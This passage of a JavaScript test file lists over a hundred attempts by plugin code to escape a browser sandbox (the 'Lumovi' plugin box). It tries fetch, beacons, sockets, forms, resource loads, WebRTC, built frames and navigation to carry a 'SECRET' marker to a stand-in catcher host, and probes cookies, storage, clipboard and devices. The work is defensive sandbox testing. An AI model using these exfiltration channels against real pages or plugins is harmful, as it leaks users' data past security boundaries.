/* eslint-disable no-undef -- runs in a browser's worker and on a page, never in Node */
// Every way out of a plugin's sealed box worth trying, as a plugin's code would try it: in the
// worker a plugin's code lives in, or on the box's own page (where none ever runs: tried there
// to know what the box's walls hold by themselves). Each returns what the code saw of it; what
// really got out is what the catchers saw (catchers.ts).
;(() => {
  const hasDom = typeof document !== 'undefined'
  const wait = (ms) => new Promise((done) => setTimeout(done, ms))
  /** Appends markup the way injected content would be. */
  const html = (markup) => {
    const holder = document.createElement('div')
    holder.innerHTML = markup
    document.body.append(holder)
    return holder
  }
  const el = (tag, props) => {
    const node = Object.assign(document.createElement(tag), props)
    document.body.append(node)
    return node
  }
  const loaded = (node) =>
    new Promise((done) => {
      node.addEventListener('load', () => done('loaded'))
      node.addEventListener('error', () => done('error event'))
      setTimeout(() => done('no event'), 700)
    })
  /** A worker from text; its first message back. */
  const workerFrom = (url) =>
    new Promise((done) => {
      try {
        const worker = new Worker(url)
        worker.onmessage = (event) => done(`ran: ${event.data}`)
        worker.onerror = (event) => done(`error event: ${event.message ?? ''}`)
        setTimeout(() => done('no answer'), 700)
      } catch (error) {
        done(`threw: ${error.name}`)
      }
    })
  const inner = (c) =>
    `fetch(${JSON.stringify(c.leak)}, {mode:'no-cors'}).then(() => postMessage('fetched'), (e) => postMessage('fetch refused'))`

  /** [id, group, needs the page, what it does] */
  const list = [
    // --- Requests ---
    [
      'fetch-other',
      'request',
      false,
      (c) => fetch(c.leak, { mode: 'no-cors' }).then(() => 'answered'),
    ],
    [
      'fetch-same-api',
      'request',
      false,
      (c) => fetch(c.api, { mode: 'no-cors', credentials: 'include' }).then(() => 'answered'),
    ],
    [
      'fetch-keepalive',
      'request',
      false,
      (c) =>
        fetch(c.leak, { mode: 'no-cors', keepalive: true, method: 'POST', body: 'x' }).then(
          () => 'answered',
        ),
    ],
    // The box's own document, asked for with something added to its address. It is at the host
    // that serves the box, where no stand-in elsewhere sees it: judged by what serves the box.
    [
      'fetch-box-document',
      'request',
      false,
      (c) =>
        c.box
          ? fetch(`${c.box}?d=SECRET-fetch-box-document`, { mode: 'no-cors' }).then(
              () => 'answered',
            )
          : 'no address of its box to ask',
    ],
    [
      'xhr-other',
      'request',
      false,
      (c) =>
        new Promise((done) => {
          if (typeof XMLHttpRequest === 'undefined') return done('no such API')
          const xhr = new XMLHttpRequest()
          xhr.open('GET', c.leak)
          xhr.onload = () => done('answered')
          xhr.onerror = () => done('error event')
          xhr.send()
        }),
    ],
    [
      'beacon',
      'request',
      false,
      (c) =>
        navigator.sendBeacon ? `returned ${navigator.sendBeacon(c.leak, 'x')}` : 'no such API',
    ],
    [
      'websocket-other',
      'request',
      false,
      (c) =>
        new Promise((done) => {
          const socket = new WebSocket(c.leak.replace('http', 'ws'))
          socket.onopen = () => done('opened')
          socket.onerror = () => done('error event')
          setTimeout(() => done('no event'), 700)
        }),
    ],
    [
      'websocket-same',
      'request',
      false,
      (c) =>
        new Promise((done) => {
          const socket = new WebSocket(c.api.replace('http', 'ws'))
          socket.onopen = () => done('opened')
          socket.onerror = () => done('error event')
          setTimeout(() => done('no event'), 700)
        }),
    ],
    [
      'eventsource',
      'request',
      false,
      (c) =>
        new Promise((done) => {
          if (typeof EventSource === 'undefined') return done('no such API')
          const source = new EventSource(c.leak)
          source.onopen = () => done('opened')
          source.onerror = () => done('error event')
        }),
    ],
    [
      'webtransport',
      'request',
      false,
      (c) => {
        if (typeof WebTransport === 'undefined') return 'no such API'
        const transport = new WebTransport(`https://${c.udpName}:${c.udpPort}/`)
        return transport.ready.then(
          () => 'ready',
          () => 'refused',
        )
      },
    ],

    // --- More script ---
    [
      'import-other',
      'script',
      false,
      (c) => import(c.leak.replace('?', '.js?')).then(() => 'imported'),
    ],
    // The box's own addresses, as scripts, with something added: a policy that named one by
    // address would match it whatever its query, and what serves the box would have been told.
    // Judged by what serves the box, as above.
    [
      'import-box-script',
      'script',
      false,
      (c) =>
        c.box
          ? import(`${c.box.replace(/box\.html$/, 'box.js')}?d=SECRET-import-box-script`).then(
              () => 'imported',
            )
          : 'no address of its box to ask',
    ],
    [
      'import-box-document',
      'script',
      false,
      (c) =>
        c.box
          ? import(`${c.box}?d=SECRET-import-box-document`).then(() => 'imported')
          : 'no address of its box to ask',
    ],
    [
      'importScripts-other',
      'script',
      false,
      (c) => {
        if (typeof importScripts === 'undefined') return 'no such API'
        importScripts(c.leak.replace('?', '.js?'))
        return 'imported'
      },
    ],
    [
      'script-tag-other',
      'script',
      true,
      (c) => loaded(el('script', { src: c.leak.replace('?', '.js?') })),
    ],
    ['eval', 'script', false, () => `eval gave ${(0, eval)('1+1')}`],
    ['new-function', 'script', false, () => `Function gave ${new Function('return 1+1')()}`],
    [
      'settimeout-text',
      'script',
      false,
      () =>
        new Promise((done) => {
          self.__ran = () => done('text ran')
          setTimeout('self.__ran()', 0)
          setTimeout(() => done('text did not run'), 300)
        }),
    ],
    [
      'inline-handler',
      'script',
      true,
      () =>
        new Promise((done) => {
          self.__ran = () => done('handler ran')
          html('<img src="x:" onerror="self.__ran()">')
          setTimeout(() => done('handler did not run'), 400)
        }),
    ],

    // --- The frame taking itself (or the page) somewhere ---
    [
      'navigate-self-other',
      'navigation',
      true,
      (c) => {
        location.href = c.leak
        return wait(900).then(() => 'still here')
      },
    ],
    [
      'navigate-self-replace',
      'navigation',
      true,
      (c) => {
        location.replace(c.leak)
        return wait(900).then(() => 'still here')
      },
    ],
    [
      'navigate-self-same-api',
      'navigation',
      true,
      (c) => {
        location.href = c.api
        return wait(900).then(() => 'still here')
      },
    ],
    [
      'navigate-self-within-its-path',
      'navigation',
      true,
      (c) => {
        location.href = `${c.same}/plugin-frame/box.html?d=SECRET&id=${c.id}`
        return wait(900).then(() => 'still here')
      },
    ],
    [
      'navigate-self-data',
      'navigation',
      true,
      () => {
        location.href = 'data:text/html,<script>1</script>'
        return wait(700).then(() => 'still here')
      },
    ],
    [
      'navigate-self-javascript',
      'navigation',
      true,
      (c) => {
        location.href = `javascript:fetch(${JSON.stringify(c.leak)},{mode:'no-cors'})`
        return wait(500).then(() => 'still here')
      },
    ],
    [
      'meta-refresh',
      'navigation',
      true,
      (c) => {
        document.head.append(
          Object.assign(document.createElement('meta'), {
            httpEquiv: 'refresh',
            content: `0;url=${c.leak}`,
          }),
        )
        return wait(900).then(() => 'still here')
      },
    ],
    [
      'link-click-self',
      'navigation',
      true,
      (c) => {
        el('a', { href: c.leak }).click()
        return wait(900).then(() => 'still here')
      },
    ],
    [
      'link-click-top',
      'navigation',
      true,
      (c) => {
        el('a', { href: c.leak, target: '_top' }).click()
        return wait(700).then(() => 'still here')
      },
    ],
    [
      'link-click-blank',
      'navigation',
      true,
      (c) => {
        el('a', { href: c.leak, target: '_blank', rel: 'noopener' }).click()
        return wait(700).then(() => 'still here')
      },
    ],
    [
      'link-ping',
      'navigation',
      true,
      (c) => {
        el('a', { href: '#', ping: c.leak }).click()
        return wait(500).then(() => 'clicked')
      },
    ],
    [
      'link-download',
      'navigation',
      true,
      (c) => {
        el('a', { href: c.leak, download: 'x' }).click()
        return wait(700).then(() => 'clicked')
      },
    ],
    [
      'top-location',
      'navigation',
      true,
      (c) => {
        top.location.href = c.leak
        return wait(700).then(() => 'still here')
      },
    ],
    [
      'parent-location',
      'navigation',
      true,
      (c) => {
        parent.location.href = c.leak
        return wait(700).then(() => 'still here')
      },
    ],
    [
      'window-open',
      'navigation',
      true,
      (c) => `open gave ${window.open(c.leak) === null ? 'nothing' : 'a window'}`,
    ],
    [
      'history-push',
      'navigation',
      true,
      (c) => {
        history.pushState(null, '', c.leak)
        return 'pushed'
      },
    ],

    // --- Forms and base (they don't fall back to default-src) ---
    [
      'form-get-other',
      'form',
      true,
      (c) => {
        const form = el('form', { action: c.leak, method: 'get' })
        form.append(Object.assign(document.createElement('input'), { name: 'd', value: 'SECRET' }))
        form.submit()
        return wait(900).then(() => 'still here')
      },
    ],
    [
      'form-post-other',
      'form',
      true,
      (c) => {
        const form = el('form', { action: c.leak, method: 'post' })
        form.submit()
        return wait(900).then(() => 'still here')
      },
    ],
    [
      'form-target-blank',
      'form',
      true,
      (c) => {
        const form = el('form', { action: c.leak, method: 'get', target: '_blank' })
        form.submit()
        return wait(700).then(() => 'still here')
      },
    ],
    [
      'button-formaction',
      'form',
      true,
      (c) => {
        const form = el('form', {})
        const button = Object.assign(document.createElement('button'), { formAction: c.leak })
        form.append(button)
        button.click()
        return wait(900).then(() => 'still here')
      },
    ],
    [
      'base-then-image',
      'form',
      true,
      (c) => {
        document.head.append(
          Object.assign(document.createElement('base'), { href: `${c.other}/catch/` }),
        )
        return loaded(el('img', { src: `${c.id}?d=SECRET` }))
      },
    ],

    // --- A picture, a link, a prefetch: an address is enough to carry data ---
    ['image', 'resource', true, (c) => loaded(el('img', { src: c.leak }))],
    [
      'image-object',
      'resource',
      false,
      (c) => {
        if (typeof Image === 'undefined') return 'no such API'
        const image = new Image()
        image.src = c.leak
        return loaded(image)
      },
    ],
    ['image-srcset', 'resource', true, (c) => loaded(el('img', { srcset: `${c.leak} 1x` }))],
    [
      'picture-source',
      'resource',
      true,
      (c) => {
        html(`<picture><source srcset="${c.leak}"><img></picture>`)
        return wait(500).then(() => 'added')
      },
    ],
    [
      'svg-image',
      'resource',
      true,
      (c) => {
        html(`<svg><image href="${c.leak}" width="1" height="1"/></svg>`)
        return wait(500).then(() => 'added')
      },
    ],
    [
      'svg-use',
      'resource',
      true,
      (c) => {
        html(`<svg><use href="${c.leak}#a"/></svg>`)
        return wait(500).then(() => 'added')
      },
    ],
    [
      'video-poster',
      'resource',
      true,
      (c) => {
        html(`<video poster="${c.leak}"></video>`)
        return wait(500).then(() => 'added')
      },
    ],
    [
      'video-src',
      'resource',
      true,
      (c) => {
        html(`<video src="${c.leak}" preload="auto"></video>`)
        return wait(500).then(() => 'added')
      },
    ],
    [
      'audio-src',
      'resource',
      true,
      (c) => {
        html(`<audio src="${c.leak}" preload="auto"></audio>`)
        return wait(500).then(() => 'added')
      },
    ],
    [
      'track',
      'resource',
      true,
      (c) => {
        html(`<video><track default src="${c.leak}"></video>`)
        return wait(500).then(() => 'added')
      },
    ],
    [
      'object-data',
      'resource',
      true,
      (c) => {
        html(`<object data="${c.leak}"></object>`)
        return wait(500).then(() => 'added')
      },
    ],
    [
      'embed-src',
      'resource',
      true,
      (c) => {
        html(`<embed src="${c.leak}">`)
        return wait(500).then(() => 'added')
      },
    ],
    [
      'input-image',
      'resource',
      true,
      (c) => {
        html(`<input type="image" src="${c.leak}">`)
        return wait(500).then(() => 'added')
      },
    ],
    [
      'style-url',
      'resource',
      true,
      (c) => {
        html(`<div style="background:url(${c.leak})">x</div>`)
        return wait(500).then(() => 'added')
      },
    ],
    [
      'style-tag-import',
      'resource',
      true,
      (c) => {
        html(`<style>@import url(${c.leak});</style>`)
        return wait(500).then(() => 'added')
      },
    ],
    [
      'stylesheet-link',
      'resource',
      true,
      (c) => loaded(el('link', { rel: 'stylesheet', href: c.leak })),
    ],
    [
      'constructed-stylesheet',
      'resource',
      true,
      (c) => {
        const sheet = new CSSStyleSheet()
        sheet.replaceSync(`body{background:url(${c.leak})}`)
        document.adoptedStyleSheets = [sheet]
        return wait(500).then(() => 'adopted')
      },
    ],
    [
      'font-face',
      'resource',
      false,
      (c) => {
        if (typeof FontFace === 'undefined') return 'no such API'
        return new FontFace('x', `url(${c.leak})`).load().then(
          () => 'loaded',
          () => 'refused',
        )
      },
    ],
    [
      'link-prefetch',
      'resource',
      true,
      (c) => {
        el('link', { rel: 'prefetch', href: c.leak })
        return wait(600).then(() => 'added')
      },
    ],
    [
      'link-preload',
      'resource',
      true,
      (c) => {
        el('link', { rel: 'preload', as: 'image', href: c.leak })
        return wait(600).then(() => 'added')
      },
    ],
    [
      'link-modulepreload',
      'resource',
      true,
      (c) => {
        el('link', { rel: 'modulepreload', href: c.leak.replace('?', '.js?') })
        return wait(600).then(() => 'added')
      },
    ],
    [
      'link-preconnect',
      'resource',
      true,
      (c) => {
        el('link', { rel: 'preconnect', href: c.other })
        return wait(600).then(() => 'added')
      },
    ],
    [
      'link-dns-prefetch',
      'resource',
      true,
      (c) => {
        el('link', { rel: 'dns-prefetch', href: c.other })
        return wait(600).then(() => 'added')
      },
    ],
    [
      'link-prerender',
      'resource',
      true,
      (c) => {
        el('link', { rel: 'prerender', href: c.leak })
        return wait(600).then(() => 'added')
      },
    ],
    [
      'link-icon',
      'resource',
      true,
      (c) => {
        el('link', { rel: 'icon', href: c.leak })
        return wait(600).then(() => 'added')
      },
    ],
    [
      'link-manifest',
      'resource',
      true,
      (c) => {
        el('link', { rel: 'manifest', href: c.leak })
        return wait(600).then(() => 'added')
      },
    ],
    [
      'speculation-rules',
      'resource',
      true,
      (c) => {
        const script = document.createElement('script')
        script.type = 'speculationrules'
        script.textContent = JSON.stringify({
          prefetch: [{ source: 'list', urls: [c.leak] }],
          prerender: [{ source: 'list', urls: [c.leak] }],
        })
        document.head.append(script)
        return wait(700).then(() => 'added')
      },
    ],
    [
      'csp-report',
      'resource',
      true,
      (c) => {
        document.head.append(
          Object.assign(document.createElement('meta'), {
            httpEquiv: 'Content-Security-Policy',
            content: `img-src 'none'; report-uri ${c.leak}`,
          }),
        )
        el('img', { src: 'data:image/gif;base64,R0lGODlhAQABAAAAACw=' })
        return wait(700).then(() => 'added')
      },
    ],

    // --- WebRTC ---
    [
      'webrtc-stun',
      'webrtc',
      true,
      (c) => {
        if (typeof RTCPeerConnection === 'undefined') return 'no such API'
        const peer = new RTCPeerConnection({
          iceServers: [{ urls: `stun:${c.udpName}:${c.udpPort}` }],
        })
        peer.createDataChannel('x')
        return peer
          .createOffer()
          .then((offer) => peer.setLocalDescription(offer))
          .then(() => wait(900))
          .then(() => `gathering ${peer.iceGatheringState}`)
      },
    ],
    [
      'webrtc-turn-tcp',
      'webrtc',
      true,
      (c) => {
        if (typeof RTCPeerConnection === 'undefined') return 'no such API'
        const peer = new RTCPeerConnection({
          iceServers: [
            {
              urls: `turn:${c.otherName}:${c.otherPort}?transport=tcp`,
              username: 'SECRET',
              credential: 'x',
            },
          ],
        })
        peer.createDataChannel('x')
        return peer
          .createOffer()
          .then((offer) => peer.setLocalDescription(offer))
          .then(() => wait(900))
          .then(() => `gathering ${peer.iceGatheringState}`)
      },
    ],

    // --- A worker or a frame from built text ---
    [
      'worker-blob',
      'built',
      false,
      (c) => workerFrom(URL.createObjectURL(new Blob([inner(c)], { type: 'text/javascript' }))),
    ],
    [
      'worker-data',
      'built',
      false,
      (c) => workerFrom(`data:text/javascript,${encodeURIComponent(inner(c))}`),
    ],
    ['worker-other', 'built', false, (c) => workerFrom(c.leak.replace('?', '.js?'))],
    [
      'shared-worker-blob',
      'built',
      false,
      (c) => {
        if (typeof SharedWorker === 'undefined') return 'no such API'
        new SharedWorker(
          URL.createObjectURL(
            new Blob([`fetch(${JSON.stringify(c.leak)}, {mode:'no-cors'})`], {
              type: 'text/javascript',
            }),
          ),
        )
        return wait(600).then(() => 'made')
      },
    ],
    [
      'service-worker',
      'built',
      false,
      (c) => {
        if (!navigator.serviceWorker) return 'no such API'
        return navigator.serviceWorker.register(`${c.same}/plugin-frame/attempts.js`).then(
          () => 'registered',
          (error) => `refused: ${error.name}`,
        )
      },
    ],
    ['frame-other', 'built', true, (c) => loaded(el('iframe', { src: c.leak }))],
    [
      'frame-srcdoc',
      'built',
      true,
      (c) => {
        el('iframe', {
          srcdoc: `<script>fetch(${JSON.stringify(c.leak)},{mode:'no-cors'})</script><img src="${c.leak}&via=img">`,
        })
        return wait(700).then(() => 'added')
      },
    ],
    [
      'frame-blob',
      'built',
      true,
      (c) => {
        el('iframe', {
          src: URL.createObjectURL(new Blob([`<img src="${c.leak}">`], { type: 'text/html' })),
        })
        return wait(700).then(() => 'added')
      },
    ],
    [
      'frame-data',
      'built',
      true,
      (c) => {
        el('iframe', { src: `data:text/html,<img src="${c.leak}">` })
        return wait(700).then(() => 'added')
      },
    ],
    [
      'frame-javascript',
      'built',
      true,
      (c) => {
        el('iframe', { src: `javascript:fetch(${JSON.stringify(c.leak)},{mode:'no-cors'})` })
        return wait(600).then(() => 'added')
      },
    ],
    [
      'document-write',
      'built',
      true,
      (c) => {
        document.write(`<img src="${c.leak}">`)
        return wait(600).then(() => 'written')
      },
    ],
    [
      'dom-parser-then-adopt',
      'built',
      true,
      (c) => {
        const parsed = new DOMParser().parseFromString(`<img src="${c.leak}">`, 'text/html')
        document.body.append(document.adoptNode(parsed.body.firstChild))
        return wait(600).then(() => 'adopted')
      },
    ],

    // --- The page around it, and anything kept ---
    ['parent-document', 'around', true, () => `read ${parent.document.title}`],
    ['parent-property', 'around', true, () => `read ${typeof parent.lumovi}`],
    ['top-location-read', 'around', true, () => `read ${top.location.href}`],
    ['frame-element', 'around', true, () => `frameElement is ${window.frameElement}`],
    ['referrer', 'around', true, () => `referrer is "${document.referrer}"`],
    [
      'ancestor-origins',
      'around',
      true,
      () =>
        `ancestors: ${location.ancestorOrigins ? [...location.ancestorOrigins].join(',') : 'no such API'}`,
    ],
    ['own-origin', 'around', false, () => `origin is ${self.origin}`],
    ['cookie-read', 'around', true, () => `cookie is "${document.cookie}"`],
    [
      'cookie-store',
      'around',
      false,
      () =>
        self.cookieStore
          ? self.cookieStore.getAll().then((all) => `cookieStore has ${all.length}`)
          : 'no such API',
    ],
    [
      'local-storage',
      'around',
      true,
      () => {
        localStorage.setItem('x', '1')
        return 'wrote'
      },
    ],
    [
      'session-storage',
      'around',
      true,
      () => {
        sessionStorage.setItem('x', '1')
        return 'wrote'
      },
    ],
    [
      'indexed-db',
      'around',
      false,
      () =>
        new Promise((done) => {
          const request = indexedDB.open('x')
          request.onsuccess = () => done('opened')
          request.onerror = () => done('error event')
          setTimeout(() => done('no event'), 600)
        }),
    ],
    [
      'cache-storage',
      'around',
      false,
      () => (self.caches ? caches.open('x').then(() => 'opened') : 'no such API'),
    ],
    [
      'storage-estimate',
      'around',
      false,
      () =>
        navigator.storage?.getDirectory
          ? navigator.storage.getDirectory().then(() => 'got a directory')
          : 'no such API',
    ],
    [
      'broadcast-channel',
      'around',
      false,
      () => {
        new BroadcastChannel('lumovi').postMessage('SECRET')
        return 'posted (heard only by its own origin: nobody)'
      },
    ],
    [
      'window-name',
      'around',
      true,
      () => {
        window.name = 'SECRET'
        return 'set (kept only while this frame lives)'
      },
    ],
    [
      'post-message-parent',
      'around',
      true,
      () => {
        parent.postMessage('SECRET', '*')
        return 'posted (the page must not listen)'
      },
    ],
    [
      'post-message-top-frames',
      'around',
      true,
      () =>
        `the page has ${top.frames.length} frames; first is ${top.frames[0] === window ? 'itself' : 'another'}`,
    ],

    // --- Stopping the person, or reaching their things ---
    [
      'alert',
      'person',
      true,
      () => {
        alert('x')
        return 'returned'
      },
    ],
    [
      'print',
      'person',
      true,
      () => {
        window.print()
        return 'returned'
      },
    ],
    [
      'clipboard-write',
      'person',
      false,
      () =>
        navigator.clipboard
          ? navigator.clipboard.writeText('SECRET').then(
              () => 'wrote',
              (error) => `refused: ${error.name}`,
            )
          : 'no such API',
    ],
    [
      'clipboard-read',
      'person',
      false,
      () =>
        navigator.clipboard?.readText
          ? navigator.clipboard.readText().then(
              () => 'read',
              (error) => `refused: ${error.name}`,
            )
          : 'no such API',
    ],
    [
      'notification',
      'person',
      false,
      () =>
        typeof Notification === 'undefined'
          ? 'no such API'
          : Notification.requestPermission().then((answer) => `answer: ${answer}`),
    ],
    [
      'geolocation',
      'person',
      true,
      () =>
        new Promise((done) => {
          navigator.geolocation.getCurrentPosition(
            () => done('got a position'),
            (error) => done(`refused: ${error.message}`),
          )
          setTimeout(() => done('no answer'), 700)
        }),
    ],
    [
      'fullscreen',
      'person',
      true,
      () =>
        document.body.requestFullscreen().then(
          () => 'full screen',
          (error) => `refused: ${error.name}`,
        ),
    ],
    [
      'pointer-lock',
      'person',
      true,
      () =>
        Promise.resolve(document.body.requestPointerLock())
          .then(() => wait(200))
          .then(() => (document.pointerLockElement ? 'locked' : 'not locked')),
    ],
    [
      'protocol-handler',
      'person',
      true,
      (c) => {
        navigator.registerProtocolHandler('web+lumovi', `${c.other}/catch/%s`)
        return 'registered'
      },
    ],

    // --- Timing, and using the machine up ---
    [
      'timer-resolution',
      'timing',
      false,
      () => {
        const seen = new Set()
        const until = performance.now() + 30
        while (performance.now() < until) seen.add(performance.now())
        const steps = [...seen].sort((a, b) => a - b)
        let least = Infinity
        for (let i = 1; i < steps.length; i++) least = Math.min(least, steps[i] - steps[i - 1])
        return `clock steps by ${least.toFixed(4)} ms`
      },
    ],
    [
      'shared-memory',
      'timing',
      false,
      () => `SharedArrayBuffer: ${typeof SharedArrayBuffer}; isolated: ${self.crossOriginIsolated}`,
    ],
    [
      'resource-timing',
      'timing',
      false,
      () =>
        `sees ${performance.getEntriesByType('resource').length} of its own loads; none of the page’s`,
    ],
    [
      'hardware',
      'timing',
      false,
      () =>
        `cores ${navigator.hardwareConcurrency}, memory ${navigator.deviceMemory ?? 'not said'}, languages ${navigator.languages?.join('/')}`,
    ],
    [
      'network-information',
      'timing',
      false,
      () =>
        navigator.connection ? `connection ${navigator.connection.effectiveType}` : 'no such API',
    ],

    // --- Text made into code (it is not a way out; who holds it matters) ---
    [
      'importScripts-blob',
      'script',
      false,
      () => {
        if (typeof importScripts === 'undefined') return 'no such API'
        importScripts(
          URL.createObjectURL(new Blob(['self.__made = 1'], { type: 'text/javascript' })),
        )
        return `ran: ${self.__made}`
      },
    ],
    [
      'import-blob',
      'script',
      false,
      () =>
        import(
          URL.createObjectURL(new Blob(['export default 1'], { type: 'text/javascript' }))
        ).then(() => 'ran'),
    ],
    [
      'import-data',
      'script',
      false,
      () => import('data:text/javascript,export default 1').then(() => 'ran'),
    ],
    [
      'wasm-compile',
      'script',
      false,
      () => WebAssembly.compile(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0])).then(() => 'ran'),
    ],
    [
      'worker-blob-plain',
      'script',
      false,
      () =>
        workerFrom(
          URL.createObjectURL(new Blob(['postMessage("made")'], { type: 'text/javascript' })),
        ),
    ],

    // --- The ways back to what the worker's first lines took away ---
    [
      'back-importScripts-inherited',
      'script',
      false,
      () => {
        for (let at = Object.getPrototypeOf(self); at; at = Object.getPrototypeOf(at)) {
          if (typeof at.importScripts === 'function') {
            at.importScripts.call(
              self,
              URL.createObjectURL
                ? URL.createObjectURL(new Blob(['self.__back = 1'], { type: 'text/javascript' }))
                : self.location.href,
            )
            return `ran through ${at.constructor?.name}: ${self.__back ?? 'itself again'}`
          }
        }
        return 'refused: nothing it inherits from has importScripts'
      },
    ],
    [
      'back-own-address',
      'script',
      false,
      async () => {
        const address = self.location?.href ?? ''
        if (!address.startsWith('blob:')) return 'no such API'
        const fetched = await fetch(address).then(
          () => 'fetched its own text',
          () => 'fetch refused',
        )
        const imported = await import(address).then(
          () => 'imported itself',
          () => 'import refused',
        )
        return `refused: ${fetched}; ${imported}`.replace(
          /^refused: (?=.*(fetched its|imported itself))/,
          'ran: ',
        )
      },
    ],
    [
      'back-worker-constructor',
      'script',
      false,
      () => {
        const found = ['Worker', 'SharedWorker'].filter((name) => {
          try {
            return (
              typeof self[name] === 'function' ||
              typeof globalThis.constructor?.[name] === 'function'
            )
          } catch {
            return false
          }
        })
        return found.length
          ? `ran: still there: ${found.join(', ')}`
          : 'refused: no Worker to be had'
      },
    ],
    [
      'back-create-object-url',
      'script',
      false,
      () =>
        typeof URL.createObjectURL === 'function' ||
        typeof self.webkitURL?.createObjectURL === 'function'
          ? 'ran: an address can still be made from text'
          : 'refused: no address can be made from text',
    ],
    // What hashes, signs and verifies: Lumovi's, never a plugin's (and some browsers' boxes have
    // it where others' don't).
    ['crypto-subtle', 'script', false, () => `${typeof self.crypto?.subtle}`],
    [
      'back-crypto-subtle',
      'script',
      false,
      () => {
        const found = []
        for (let at = self.crypto; at; at = Object.getPrototypeOf(at)) {
          if (Object.getOwnPropertyDescriptor(at, 'subtle')) {
            found.push(`subtle on ${at.constructor?.name ?? 'what it inherits from'}`)
          }
        }
        try {
          new SubtleCrypto()
          found.push('a SubtleCrypto made')
        } catch {
          // (Never made, here or anywhere: no such API, or not one to make.)
        }
        return found.length ? `ran: ${found.join(', ')}` : 'refused: nothing hands it back'
      },
    ],

    // --- More requests ---
    [
      'websocketstream',
      'request',
      false,
      (c) => {
        if (typeof WebSocketStream === 'undefined') return 'no such API'
        return new WebSocketStream(c.leak.replace('http', 'ws')).opened.then(
          () => 'opened',
          () => 'refused',
        )
      },
    ],
    [
      'fetch-later',
      'request',
      true,
      (c) => {
        if (typeof fetchLater === 'undefined') return 'no such API'
        fetchLater(c.leak, { activateAfter: 0 })
        return wait(500).then(() => 'asked')
      },
    ],
    [
      'fetch-refused-lookup',
      'request',
      false,
      (c) =>
        fetch(`https://lookup-${c.id}.other.test/`, { mode: 'no-cors' }).then(() => 'answered'),
    ],

    // --- Leaving by another program ---
    [
      'mailto-navigate',
      'navigation',
      true,
      () => {
        location.href = 'mailto:x@other.test?body=SECRET'
        return wait(600).then(() => 'still here')
      },
    ],
    [
      'mailto-link',
      'navigation',
      true,
      () => {
        el('a', { href: 'mailto:x@other.test?body=SECRET' }).click()
        return wait(600).then(() => 'still here')
      },
    ],
    [
      'custom-scheme-navigate',
      'navigation',
      true,
      () => {
        location.href = 'web+lumovi-try:SECRET'
        return wait(600).then(() => 'still here')
      },
    ],
    [
      'tel-link',
      'navigation',
      true,
      () => {
        el('a', { href: 'tel:+15550100' }).click()
        return wait(600).then(() => 'still here')
      },
    ],
    [
      'history-back',
      'navigation',
      true,
      () => {
        history.back()
        return wait(700).then(() => 'still here')
      },
    ],
    [
      'history-go',
      'navigation',
      true,
      () => {
        history.go(-1)
        return wait(700).then(() => 'still here')
      },
    ],

    // --- More that an address alone carries ---
    [
      'attributionsrc',
      'resource',
      true,
      (c) => {
        html(`<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" attributionsrc="${c.leak}">`)
        return wait(600).then(() => 'added')
      },
    ],
    [
      'fencedframe',
      'resource',
      true,
      (c) => {
        html(`<fencedframe src="${c.leak}"></fencedframe>`)
        return wait(600).then(() => 'added')
      },
    ],
    [
      'link-preload-fetch',
      'resource',
      true,
      (c) => {
        el('link', { rel: 'preload', as: 'fetch', href: c.leak, crossOrigin: 'anonymous' })
        return wait(600).then(() => 'added')
      },
    ],
    [
      'link-compression-dictionary',
      'resource',
      true,
      (c) => {
        el('link', { rel: 'compression-dictionary', href: c.leak })
        return wait(600).then(() => 'added')
      },
    ],
    [
      'svg-feimage',
      'resource',
      true,
      (c) => {
        html(
          `<svg width="2" height="2"><filter id="f"><feImage href="${c.leak}"/></filter><rect width="2" height="2" filter="url(#f)"/></svg>`,
        )
        return wait(600).then(() => 'added')
      },
    ],
    [
      'svg-script',
      'resource',
      true,
      (c) => {
        const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg')
        const script = document.createElementNS('http://www.w3.org/2000/svg', 'script')
        script.setAttribute('href', c.leak.replace('?', '.js?'))
        svg.append(script)
        document.body.append(svg)
        return wait(600).then(() => 'added')
      },
    ],
    [
      'body-background',
      'resource',
      true,
      (c) => {
        document.body.setAttribute('background', c.leak)
        return wait(600).then(() => 'set')
      },
    ],
    [
      'style-cursor-and-more',
      'resource',
      true,
      (c) => {
        html(
          `<ul style="cursor:url(${c.leak}&via=cursor),auto;list-style-image:url(${c.leak}&via=list);mask:url(${c.leak}&via=mask);background:image-set(url(${c.leak}&via=set) 1x)"><li>x</li></ul>`,
        )
        return wait(600).then(() => 'added')
      },
    ],

    // --- The person's things, again ---
    [
      'credentials-get',
      'person',
      true,
      () =>
        navigator.credentials
          ? navigator.credentials
              .get({ publicKey: { challenge: new Uint8Array(8), timeout: 400 } })
              .then(
                () => 'answered',
                (error) => `refused: ${error.name}`,
              )
          : 'no such API',
    ],
    [
      'payment-request',
      'person',
      true,
      (c) => {
        if (typeof PaymentRequest === 'undefined') return 'no such API'
        return new PaymentRequest([{ supportedMethods: c.leak }], {
          total: { label: 'x', amount: { currency: 'USD', value: '1' } },
        })
          .show()
          .then(
            () => 'shown',
            (error) => `refused: ${error.name}`,
          )
      },
    ],
    [
      'share',
      'person',
      true,
      () =>
        navigator.share
          ? navigator.share({ text: 'SECRET' }).then(
              () => 'shared',
              (error) => `refused: ${error.name}`,
            )
          : 'no such API',
    ],
    [
      'file-picker',
      'person',
      true,
      () =>
        self.showOpenFilePicker
          ? self.showOpenFilePicker().then(
              () => 'picked',
              (error) => `refused: ${error.name}`,
            )
          : 'no such API',
    ],
    [
      'take-focus',
      'person',
      true,
      () => {
        window.focus()
        const field = el('input', {})
        field.focus()
        return `focus: ${document.hasFocus()} (keys typed while a frame has it go to the frame)`
      },
    ],
    [
      'features-allowed',
      'person',
      true,
      () => {
        const policy = document.featurePolicy ?? document.permissionsPolicy
        if (!policy?.allowedFeatures) return 'no such API'
        const allowed = policy.allowedFeatures()
        return allowed.length
          ? `allowed: ${allowed.join(', ')}`
          : 'refused: none of the browser’s features is allowed'
      },
    ],

    // --- Devices, the graphics card, the machine (a worker on a secure origin has these) ---
    ['secure-context', 'machine', false, () => `secure context: ${self.isSecureContext}`],
    [
      'usb-devices',
      'machine',
      false,
      () =>
        navigator.usb
          ? navigator.usb.getDevices().then(
              (all) => `usb answered: ${all.length}`,
              (error) => `refused: ${error.name}`,
            )
          : 'no such API',
    ],
    [
      'serial-ports',
      'machine',
      false,
      () =>
        navigator.serial
          ? navigator.serial.getPorts().then(
              (all) => `serial answered: ${all.length}`,
              (error) => `refused: ${error.name}`,
            )
          : 'no such API',
    ],
    [
      'hid-devices',
      'machine',
      false,
      () =>
